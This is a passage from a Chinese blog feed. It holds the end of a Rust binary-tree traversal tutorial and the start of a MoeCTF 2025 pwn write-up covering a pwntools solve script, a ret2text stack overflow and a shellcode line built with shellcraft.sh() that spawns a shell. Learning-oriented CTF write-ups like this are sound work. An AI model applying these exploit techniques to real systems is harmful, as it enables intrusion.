punctuation">(</span><span class="token string">"&#123;&#125;"</span><span class="token punctuation">,</span><span class="token keyword">self</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span><span class="token function">unwrap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">.</span>left <span class="token punctuation">&#123;</span>        l<span class="token punctuation">.</span><span class="token function">pre_order_traverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">.</span>right <span class="token punctuation">&#123;</span>        r<span class="token punctuation">.</span><span class="token function">pre_order_traverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">fn</span> <span class="token function-definition function">post_order_traverse</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token keyword">self</span><span class="token punctuation">.</span>data <span class="token operator">==</span> <span class="token class-name">None</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">.</span>left <span class="token punctuation">&#123;</span>        l<span class="token punctuation">.</span><span class="token function">post_order_traverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">.</span>right <span class="token punctuation">&#123;</span>        r<span class="token punctuation">.</span><span class="token function">post_order_traverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"&#123;&#125;"</span><span class="token punctuation">,</span><span class="token keyword">self</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span><span class="token function">unwrap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">fn</span> <span class="token function-definition function">in_order_traverse</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token keyword">self</span><span class="token punctuation">.</span>data <span class="token operator">==</span> <span class="token class-name">None</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">.</span>left <span class="token punctuation">&#123;</span>        l<span class="token punctuation">.</span><span class="token function">in_order_traverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"&#123;&#125;"</span><span class="token punctuation">,</span><span class="token keyword">self</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span><span class="token function">unwrap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">.</span>right <span class="token punctuation">&#123;</span>        r<span class="token punctuation">.</span><span class="token function">in_order_traverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>……<span class="token attribute attr-name">#[test]</span><span class="token keyword">fn</span> <span class="token function-definition function">test_trans</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> t <span class="token operator">=</span> <span class="token class-name">BinaryTree</span><span class="token punctuation">::</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> s <span class="token operator">=</span> <span class="token string">"ABC  DE G  F   "</span><span class="token punctuation">;</span>    t<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>    t<span class="token punctuation">.</span><span class="token function">in_order_traverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    t<span class="token punctuation">.</span><span class="token function">post_order_traverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    t<span class="token punctuation">.</span><span class="token function">pre_order_traverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>很常规的递归写法，由于self不需要可变，一切都很顺利，测试结果也符合预期</p><h2 id="打印二叉树结构"><a href="#打印二叉树结构" class="headerlink" title="打印二叉树结构"></a>打印二叉树结构</h2><pre class="line-numbers language-text" data-language="text"><code class="language-text">按凹入表形式横向打印二叉树结构，即二叉树的根在屏幕的最左边，二叉树的左子树在屏幕的下边，二叉树的右子树在屏幕的上边。[实现提示]利用 RDL 遍历方法;(中序遍历右子树、根节点、中序遍历左子树 RDL)利用结点的深度控制横向位置。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>要解决的问题是确定凹入表中每个节点的横纵坐标，根据提示，横向坐标用特定的遍历方式（右、中、左），每次打印一行确定，纵向坐标依据节点深度确定，那思路就很清晰了：</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust">    <span class="token keyword">fn</span> <span class="token function-definition function">print</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">,</span> depth <span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token keyword">self</span><span class="token punctuation">.</span>data <span class="token operator">==</span> <span class="token class-name">None</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">.</span>right <span class="token punctuation">&#123;</span>            r<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>depth <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">let</span> spaces <span class="token operator">=</span> <span class="token string">" "</span><span class="token punctuation">.</span><span class="token function">repeat</span><span class="token punctuation">(</span>depth <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"&#123;&#125;&#123;&#125;"</span><span class="token punctuation">,</span> spaces<span class="token punctuation">,</span> <span class="token keyword">self</span><span class="token punctuation">.</span>data<span class="token punctuation">.</span><span class="token function">unwrap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">.</span>left <span class="token punctuation">&#123;</span>            l<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>depth <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token comment">//测试</span>    <span class="token attribute attr-name">#[test]</span>    <span class="token keyword">fn</span> <span class="token function-definition function">test_print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> <span class="token keyword">mut</span> t <span class="token operator">=</span> <span class="token class-name">BinaryTree</span><span class="token punctuation">::</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">let</span> <span class="token keyword">mut</span> s <span class="token operator">=</span> <span class="token string">"ABD  E  CF  G  "</span><span class="token punctuation">;</span>        t<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>        t<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结果:<br><pre class="line-numbers language-text" data-language="text"><code class="language-text">running 1 test    G  C    FA    E  B    Dtest tests::test_print ... ok<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><h2 id="采用非递归算法实现二叉树的遍历"><a href="#采用非递归算法实现二叉树的遍历" class="headerlink" title="采用非递归算法实现二叉树的遍历"></a>采用非递归算法实现二叉树的遍历</h2><p>非递归，需要借助一点技巧，也就是栈。正常递归时会将下一个要执行的指令地址入栈，由于前序遍历先访问当前节点，所以可以模拟这个过程</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">fn</span> <span class="token function-definition function">pre_order</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> stack <span class="token punctuation">:</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token operator">&amp;</span><span class="token class-name">BinaryTree</span><span class="token operator">></span> <span class="token operator">=</span> <span class="token class-name">Vec</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token keyword">self</span><span class="token punctuation">.</span>data <span class="token operator">==</span> <span class="token class-name">None</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token keyword">self</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span> <span class="token operator">=</span> stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">=</span> node<span class="token punctuation">.</span>data <span class="token punctuation">&#123;</span>            <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"&#123;&#125;"</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>right<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">&amp;</span>node<span class="token punctuation">.</span>right <span class="token punctuation">&#123;</span>                stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>left<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">&amp;</span>node<span class="token punctuation">.</span>left <span class="token punctuation">&#123;</span>                stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>先把下一个要访问的节点入栈（右子树），再访问当前节点及（左子树）</p><p>后序遍历先访问的节点后输出，所以可以再用一个栈来模拟<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">fn</span> <span class="token function-definition function">post_order</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> stack1 <span class="token operator">=</span> <span class="token class-name">Vec</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> stack2 <span class="token operator">=</span> <span class="token class-name">Vec</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    stack1<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token keyword">self</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span> <span class="token operator">=</span> stack1<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        stack2<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>left<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">&amp;</span>node<span class="token punctuation">.</span>left <span class="token punctuation">&#123;</span>            stack1<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>         <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>right<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">&amp;</span>node<span class="token punctuation">.</span>right <span class="token punctuation">&#123;</span>            stack1<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// stack2中的顺序就是后序遍历的逆序</span>    <span class="token keyword">while</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span> <span class="token operator">=</span> stack2<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">=</span> node<span class="token punctuation">.</span>data <span class="token punctuation">&#123;</span>            <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"&#123;&#125;"</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><p>优先输出的是左下方的，所以先访问右子树，左子树先入栈</p><p>中序遍历，左中右。沿着左子树走到叶节点，将过程中访问的节点入栈，然后访问该叶节点，往上追溯访问上一个节点，访问其右子树，如果遇到None则重新从栈pop<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">fn</span> <span class="token function-definition function">in_order</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> stack <span class="token operator">=</span> <span class="token class-name">Vec</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> current <span class="token operator">=</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token keyword">self</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> current<span class="token punctuation">.</span><span class="token function">is_some</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span>stack<span class="token punctuation">.</span><span class="token function">is_empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">while</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span> <span class="token operator">=</span> current <span class="token punctuation">&#123;</span>            stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">;</span>            current <span class="token operator">=</span> node<span class="token punctuation">.</span>left<span class="token punctuation">.</span><span class="token function">as_ref</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token closure-params"><span class="token closure-punctuation punctuation">|</span>n<span class="token closure-punctuation punctuation">|</span></span> <span class="token operator">&amp;</span><span class="token operator">*</span><span class="token operator">*</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span> <span class="token operator">=</span> stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">=</span> node<span class="token punctuation">.</span>data <span class="token punctuation">&#123;</span>                <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"&#123;&#125;"</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            current <span class="token operator">=</span> node<span class="token punctuation">.</span>right<span class="token punctuation">.</span><span class="token function">as_ref</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token closure-params"><span class="token closure-punctuation punctuation">|</span>n<span class="token closure-punctuation punctuation">|</span></span> <span class="token operator">&amp;</span><span class="token operator">*</span><span class="token operator">*</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>测试：<br><pre class="line-numbers language-text" data-language="text"><code class="language-text">#[test]fn test_pre_order()&#123;    let mut t = BinaryTree::init();    let mut s = "ABC  DE G  F   ";    t.create(&amp;mut s);    //t.pre_order();    //t.post_order();    t.in_order();&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h2 id=&quot;二叉树的建立与遍历&quot;&gt;&lt;a href=&quot;#二叉树的建立与遍历&quot; class=&quot;headerlink&quot; title=&quot;二叉树的建立与遍历&quot;&gt;&lt;/a&gt;二叉树的建立与遍历&lt;/h2&gt;&lt;pre class=&quot;line-numbers language-text&quot;</summary>
        
      
    
    
    
    <category term="从0开始的rust之旅" scheme="https://aucept.in/categories/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84rust%E4%B9%8B%E6%97%85/"/>
    
    
    <category term="rust" scheme="https://aucept.in/tags/rust/"/>
    
  </entry>
  
  <entry>
    <title>Moectf 2025</title>
    <link href="https://aucept.in/2025/10/26/moectf-2025/"/>
    <id>https://aucept.in/2025/10/26/moectf-2025/</id>
    <published>2025-10-26T06:38:17.000Z</published>
    <updated>2025-11-16T13:57:47.374Z</updated>
    
    <content type="html"><![CDATA[<p>一份<del>迟到的</del>不必要的WP，同时也是回顾si进pwn的世界的第一个月</p><h3 id="0-二进制漏洞审计入门指北"><a href="#0-二进制漏洞审计入门指北" class="headerlink" title="0 二进制漏洞审计入门指北"></a>0 二进制漏洞审计入门指北</h3><p>真正的梦开始的地方，从熟悉流程开始，题目里把解题脚本直接给了出来：<br><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>                                    <span class="token comment"># 导入 pwntools。</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span> <span class="token comment"># 一些基本的配置。</span><span class="token comment"># 有时我们需要在本地调试运行程序，需要配置 context.terminal。详见入门指北。</span><span class="token comment"># io = process('./pwn')             # 在本地运行程序。</span><span class="token comment"># gdb.attach(io)                    # 启动 GDB</span>io <span class="token operator">=</span> connect<span class="token punctuation">(</span>???<span class="token punctuation">,</span> ???<span class="token punctuation">)</span>              <span class="token comment"># 与在线环境交互。</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'114511'</span><span class="token punctuation">)</span>              <span class="token comment"># 什么时候用 send 什么时候用 sendline？</span>payload  <span class="token operator">=</span> p32<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span>          <span class="token comment"># p32(0xdeadbeef)、b"\xde\xad\xbe\xef"、b"deadbeef" 有什么区别？</span>                                    <span class="token comment"># 你看懂原程序这里的检查逻辑了吗？</span>payload <span class="token operator">+=</span> <span class="token string">b'shuijiangui'</span>           <span class="token comment"># strcmp</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'password.'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span> <span class="token comment"># 发送！通过所有的检查。</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>                    <span class="token comment"># 手动接收 flag。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><p>正常的程序运行流程就会进入后门，需要输入一次数字和一次字符串，都通过比较即可进入后门，读出flag，这不是重点</p><p>pwntools提供了<code>process</code> <code>connect</code>等等函数以自动化与程序交互。仍记得第一次看到以上脚本时的茫然。</p><h3 id="1-ez-u64"><a href="#1-ez-u64" class="headerlink" title="1 ez_u64"></a>1 ez_u64</h3><p>这道题需要认识到数字的实际存储与看到的并不等同。</p><p>程序以字节形式输出了一个数字，它看起来大概是这样的：�␦�`’Ce@，8个莫名奇妙的字符</p><p>借助pwntools的u64可以将其还原回数字。同时这个数字每次运行不同，需要我去手动接收输出的字符</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#……</span>hint_data <span class="token operator">=</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>num <span class="token operator">=</span> u64<span class="token punctuation">(</span>hint_data<span class="token punctuation">)</span><span class="token comment">#……</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="1-find-it"><a href="#1-find-it" class="headerlink" title="1 find it"></a>1 find it</h3><p>涉及文件描述符的分配策略，即需要时返回当前可用的最小的文件描述符</p><p>read和write函数的三个参数均为：文件描述符、缓冲区、缓冲区大小</p><p>本题中先是<code>v3 = dup(1);</code>复制了标准输出的stdout，这里给v3的文件描述符的就是3，然后close(1)把标准输出关闭，再执行了一个open输入文件，并让我们猜出其文件描述符，即重新变得可用的1</p><h3 id="2-EZtext"><a href="#2-EZtext" class="headerlink" title="2 EZtext"></a>2 EZtext</h3><p>如果说前几道题只是学习pwn之前要掌握的基本知识，这里终于算迈进了pwn的大门</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __fastcall <span class="token function">overflow</span><span class="token punctuation">(</span><span class="token keyword">int</span> a1<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  _BYTE buf<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-8h] BYREF</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> a1 <span class="token operator">&lt;=</span> <span class="token number">7</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Come on, you can't even fill up this array?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> a1<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"OK,I receive your byte.and then?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里的a1是一个自己输入的任意数字，题目贴心地提醒我们要利用栈溢出</p><p>于是正式开始了ROP的过程，是一个基础的ret2text，有后门函数，把后门函数地址覆盖在栈上存函数返回地址的位置即可</p><h3 id="ezshellcode"><a href="#ezshellcode" class="headerlink" title="ezshellcode"></a>ezshellcode</h3><p>本道题没有了后门函数，但是某种程度上更加直白：<br><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> s<span class="token punctuation">,</span> <span class="token number">0x1000u</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">)</span>s<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><br>读一个字符串然后不管三七二十一直接执行，所以直接发送一个进入shell的shellcode，用pwntools里的shellcraft可以很方便的构造出来，再用asm转成字节码：<br><pre class="line-numbers language-python" data-language="python"><code class="language-python">shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p><h3 id="3-认识libc"><a href="#3-认识libc" class="headerlink" title="3 认识libc"></a>3 